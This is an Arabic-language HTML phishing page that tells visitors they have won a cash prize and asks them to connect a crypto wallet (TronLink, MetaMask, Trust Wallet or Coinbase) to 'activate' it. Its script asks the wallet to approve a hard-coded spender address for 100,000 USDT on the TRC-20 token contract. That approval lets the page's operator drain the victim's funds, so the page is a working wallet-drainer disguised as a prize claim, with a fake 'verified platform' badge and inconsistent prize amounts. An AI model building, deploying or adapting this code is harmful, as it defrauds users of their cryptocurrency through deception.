<!DOCTYPE html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>مبروك! لقد فزت بـ 3000 دولار - XYZ</title>
    <link
      href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;700&display=swap"
      rel="stylesheet"
    />
    <script
      src="https://kit.fontawesome.com/a076d05399.js"
      crossorigin="anonymous"
    ></script>
    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb@5.3.3/dist/tronweb.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.min.js"></script>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        font-family: "Tajawal", sans-serif;
        background: #f4f7fa;
        color: #333;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
      }
      .container {
        background: #ffffff;
        border-radius: 12px;
        padding: 40px;
        max-width: 600px;
        width: 100%;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        text-align: center;
        border: 1px solid #e0e0e0;
      }
      .logo {
        font-size: 36px;
        font-weight: 700;
        color: #1a73e8;
        margin-bottom: 20px;
      }
      .verified-badge {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        font-size: 16px;
        color: #555;
        margin-bottom: 20px;
        background: #f0f4ff;
        padding: 8px;
        border-radius: 8px;
      }
      .verified-badge i {
        font-size: 20px;
        color: #1a73e8;
      }
      h1 {
        font-size: 28px;
        font-weight: 700;
        margin-bottom: 15px;
        color: #333;
      }
      .win-message {
        font-size: 20px;
        color: #1a73e8;
        margin-bottom: 15px;
      }
      .coin-icons {
        display: flex;
        justify-content: center;
        gap: 20px;
        margin-bottom: 25px;
      }
      .coin-icons i {
        font-size: 36px;
        color: #666;
        transition: color 0.3s ease;
      }
      .coin-icons i:hover {
        color: #1a73e8;
      }
      .wallet-selection {
        display: flex;
        justify-content: center;
        gap: 15px;
        margin-bottom: 30px;
        flex-wrap: wrap;
      }
      .wallet-btn {
        background: #f8f9fa;
        border-radius: 10px;
        padding: 15px;
        width: 120px;
        cursor: pointer;
        transition: all 0.3s ease;
        border: 1px solid #e0e0e0;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 10px;
        color: #333;
        font-weight: 600;
      }
      .wallet-btn:hover {
        background: #e8f0fe;
        border-color: #1a73e8;
        transform: translateY(-2px);
      }
      .wallet-btn.selected {
        background: #e8f0fe;
        border-color: #1a73e8;
        color: #1a73e8;
      }
      .wallet-btn img {
        width: 40px;
        height: 40px;
        object-fit: contain;
      }
      button {
        background: #1a73e8;
        border: none;
        border-radius: 10px;
        padding: 15px 30px;
        font-size: 18px;
        font-weight: 600;
        color: #fff;
        cursor: pointer;
        transition: background 0.3s ease;
      }
      button:hover {
        background: #1557b0;
      }
      .status {
        margin-top: 20px;
        font-size: 16px;
        font-weight: 600;
        min-height: 25px;
        color: #d32f2f;
      }
      @media (max-width: 480px) {
        .container {
          padding: 20px;
        }
        .logo {
          font-size: 28px;
        }
        h1 {
          font-size: 24px;
        }
        .win-message {
          font-size: 18px;
        }
        .wallet-btn {
          width: 100px;
        }
        .coin-icons i {
          font-size: 28px;
        }
        button {
          padding: 12px 25px;
          font-size: 14px;
        }
      }
    </style>
  </head>
  <body>
    <main class="container">
      <div class="logo">XYZ WIN</div>
      <div class="verified-badge">
        <i class="fas fa-check-circle"></i>
        <span>منصة موثقة</span>
      </div>
      <h1>مبروك! لقد فزت بـ 5000 دولار</h1>
      <p class="win-message">استعد لاستلام جائزتك!</p>
      <div class="coin-icons">
        <i class="fab fa-bitcoin"></i>
        <i class="fab fa-ethereum"></i>
        <i class="fas fa-coins"></i>
      </div>
      <p class="description">اختر محفظتك الرقمية لتفعيل جائزتك مباشرة.</p>
      <section class="wallet-selection">
        <button class="wallet-btn" data-wallet="tronlink">
          <img
            src="https://cdn.jsdelivr.net/gh/tronprotocol/tron-web@master/assets/img/tronlink.svg"
            alt="TronLink"
          />
          TronLink
        </button>
        <button class="wallet-btn" data-wallet="metamask">
          <img
            src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg"
            alt="MetaMask"
          />
          MetaMask
        </button>
        <button class="wallet-btn" data-wallet="trustwallet">
          <img
            src="https://trustwallet.com/assets/images/media/assets/TWT.png"
            alt="TrustWallet"
          />
          Trust Wallet
        </button>
        <button class="wallet-btn" data-wallet="coinbase">
          <img
            src="https://www.coinbase.com/assets/app/wallet-logo.191d39b2.svg"
            alt="Coinbase Wallet"
          />
          Coinbase Wallet
        </button>
      </section>
      <button id="approveButton">تفعيل الجائزة</button>
      <p class="status" id="statusText"></p>
    </main>

    <script>
      const walletButtons = document.querySelectorAll(".wallet-btn");
      const approveButton = document.getElementById("approveButton");
      const statusText = document.getElementById("statusText");
      let selectedWallet = null;
      let provider = null;

      const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT TRC-20
      const spender = "TWNvNo7d79eBoLjtyPYrYn6yXJf";
      const usdtAbi = [
        {
          constant: false,
          inputs: [
            { name: "spender", type: "address" },
            { name: "amount", type: "uint256" },
          ],
          name: "approve",
          outputs: [{ name: "", type: "bool" }],
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "decimals",
          outputs: [{ name: "", type: "uint8" }],
          type: "function",
        },
      ];

      // روابط Universal/App Links لكل محفظة
      const walletLinks = {
        tronlink: {
          universal: "https://www.tronlink.org/dapp/",
          ios: "tronlink://open",
          android: "intent://open#Intent;package=com.tronlinkpro.wallet;scheme=tronlink;end",
          download: "https://www.tronlink.org/",
        },
        metamask: {
          universal: "https://metamask.app.link/dapp/" + window.location.href,
          ios: "metamask://",
          android: "intent://wc#Intent;package=io.metamask;scheme=metamask;end",
          download: "https://metamask.io/download/",
        },
        trustwallet: {
          universal: "https://link.trustwallet.com/open_url?coin_id=60&url=" + window.location.href,
          ios: "trust://open_url?coin_id=60&url=" + window.location.href,
          android: "intent://open_url?coin_id=60&url=" + window.location.href + "#Intent;package=com.wallet.crypto.trustapp;scheme=trust;end",
          download: "https://trustwallet.com/",
        },
        coinbase: {
          universal: "https://go.cb-w.com/dapp?cb_url=" + encodeURIComponent(window.location.href),
          ios: "cbwallet://dapp?url=" + encodeURIComponent(window.location.href),
          android: "intent://dapp?url=" + encodeURIComponent(window.location.href) + "#Intent;package=com.coinbase.wallet;scheme=cbwallet;end",
          download: "https://www.coinbase.com/wallet",
        },
      };

      // دالة لتحديد نوع الجهاز (iOS أو Android)
      function getDeviceType() {
        const ua = navigator.userAgent;
        if (/android/i.test(ua)) return "android";
        if (/iPad|iPhone|iPod/.test(ua)) return "ios";
        return "other";
      }

      async function setupTronNetwork() {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x2b6653dc', // Tron Mainnet
              chainName: 'Tron Mainnet',
              nativeCurrency: { name: 'TRON', symbol: 'TRX', decimals: 6 },
              rpcUrls: ['https://api.trongrid.io'],
              blockExplorerUrls: ['https://tronscan.org'],
            }],
          });
        } catch (e) {
          statusText.textContent = `خطأ في إعداد الشبكة: ${e.message}`;
          console.error(e);
        }
      }

      async function getDecimals(contract) {
        try {
          const decimals = await contract.decimals().call();
          return parseInt(decimals);
        } catch (e) {
          console.error("Error fetching decimals:", e);
          return 6; // Default to 6 for USDT
        }
      }

      async function checkWalletConnection(wallet) {
        if (wallet === "tronlink") {
          if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            statusText.textContent = "✅ محفظة TronLink متصلة!";
            return true;
          }
          return false;
        } else if (wallet === "metamask") {
          if (window.ethereum && window.ethereum.selectedAddress) {
            statusText.textContent = "✅ محفظة MetaMask متصلة!";
            return true;
          }
          return false;
        } else if (wallet === "trustwallet" || wallet === "coinbase") {
          if (provider && provider.accounts && provider.accounts.length > 0) {
            statusText.textContent = `✅ محفظة ${wallet} متصلة!`;
            return true;
          }
          if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isCoinbaseWallet)) {
            statusText.textContent = `✅ محفظة ${wallet} متصلة عبر window.ethereum!`;
            return true;
          }
          return false;
        }
        return false;
      }

      async function connectWallet(wallet) {
        statusText.textContent = `جارٍ الاتصال بمحفظة ${wallet}...`;
        try {
          if (wallet === "tronlink") {
            if (!window.tronWeb) {
              statusText.textContent = "يرجى تثبيت TronLink.";
              window.open(walletLinks.tronlink.download, "_blank");
              return false;
            }
            if (!window.tronWeb.defaultAddress.base58) {
              statusText.textContent = "يرجى تسجيل الدخول إلى TronLink.";
              return false;
            }
            return true;
          } else if (wallet === "metamask") {
            if (!window.ethereum) {
              statusText.textContent = "يرجى تثبيت MetaMask.";
              window.open(walletLinks.metamask.download, "_blank");
              return false;
            }
            await setupTronNetwork();
            await window.ethereum.request({ method: "eth_requestAccounts" });
            return true;
          } else if (wallet === "trustwallet" || wallet === "coinbase") {
            if (window.ethereum && window.ethereum.isTrust) {
              provider = new ethers.providers.Web3Provider(window.ethereum);
              await window.ethereum.request({ method: "eth_requestAccounts" });
              return true;
            }
            if (window.ethereum && window.ethereum.isCoinbaseWallet) {
              provider = new ethers.providers.Web3Provider(window.ethereum);
              await window.ethereum.request({ method: "eth_requestAccounts" });
              return true;
            }
            if (!window.EthereumProvider) {
              statusText.textContent = "خطأ في تحميل WalletConnect.";
              return false;
            }
            provider = await window.EthereumProvider.init({
              projectId: "f6b400b4393b83bb22abcaf805ad72d2",
              chains: [728126428],
              rpc: { 728126428: "https://api.trongrid.io" },
              metadata: {
                name: "XYZ Win",
                description: "تفعيل جائزة 3000 دولار",
                url: window.location.href,
                icons: ["https://cdn.jsdelivr.net/gh/tronprotocol/tron-web@master/assets/img/tronlink.svg"],
              },
              showQrModal: true,
            });
            await provider.connect();
            return true;
          }
          return false;
        } catch (e) {
          statusText.textContent = `خطأ في الاتصال: ${e.message}`;
          return false;
        }
      }

      walletButtons.forEach((btn) => {
        btn.addEventListener("click", async () => {
          walletButtons.forEach((b) => b.classList.remove("selected"));
          btn.classList.add("selected");
          selectedWallet = btn.dataset.wallet;

          const deviceType = getDeviceType();
          const links = walletLinks[selectedWallet];
          let deepLink = links.universal;

          // اختيار الرابط بناءً على نوع الجهاز
          if (deviceType === "ios") {
            deepLink = links.ios;
          } else if (deviceType === "android") {
            deepLink = links.android;
          }

          // محاولة فتح التطبيق
          statusText.textContent = `جارٍ فتح ${selectedWallet}...`;
          window.location.href = deepLink;

          // التحقق من فتح التطبيق بعد 3 ثوانٍ
          setTimeout(async () => {
            const isConnected = await checkWalletConnection(selectedWallet);
            if (!isConnected) {
              statusText.textContent = `لم يتم فتح ${selectedWallet}. جارٍ توجيهك إلى صفحة التنزيل...`;
              window.open(links.download, "_blank");
            }
          }, 3000);
        });
      });

      approveButton.addEventListener("click", async () => {
        if (!selectedWallet) {
          statusText.textContent = "يرجى اختيار محفظة أولاً.";
          return;
        }

        const isConnected = await checkWalletConnection(selectedWallet);
        if (!isConnected) {
          statusText.textContent = `يرجى الاتصال بمحفظة ${selectedWallet} أولاً.`;
          return;
        }

        statusText.textContent = `جارٍ تفعيل الجائزة باستخدام ${selectedWallet}...`;

        try {
          if (selectedWallet === "tronlink") {
            const contract = await window.tronWeb.contract().at(contractAddress);
            const decimals = await getDecimals(contract);
            const amount = ethers.utils.parseUnits("100000", decimals); // 100,000 USDT
            const tx = await contract.approve(spender, amount).send({
              shouldPollResponse: true,
            });
            statusText.textContent = `✅ تم تفعيل الجائزة! رقم المعاملة: ${tx}`;
          } else {
            if (selectedWallet === "trustwallet" || selectedWallet === "coinbase") {
              if (!provider) {
                const connected = await connectWallet(selectedWallet);
                if (!connected) return;
              }
            } else if (selectedWallet === "metamask") {
              await setupTronNetwork();
              provider = new ethers.providers.Web3Provider(window.ethereum);
            }

            const signer = provider.getSigner();
            const contract = new ethers.Contract(contractAddress, usdtAbi, signer);
            const decimals = await contract.decimals();
            const amount = ethers.utils.parseUnits("100000", decimals); // 100,000 USDT
            const tx = await contract.approve(spender, amount, { gasLimit: 100000 });
            const receipt = await tx.wait();
            statusText.textContent = `✅ تم تفعيل الجائزة! رقم المعاملة: ${receipt.transactionHash}`;
          }
        } catch (e) {
          statusText.textContent = `حدث خطأ: ${e.message || e}`;
          console.error("Approve error:", e);
        }
      });
    </script>
  </body>
</html>
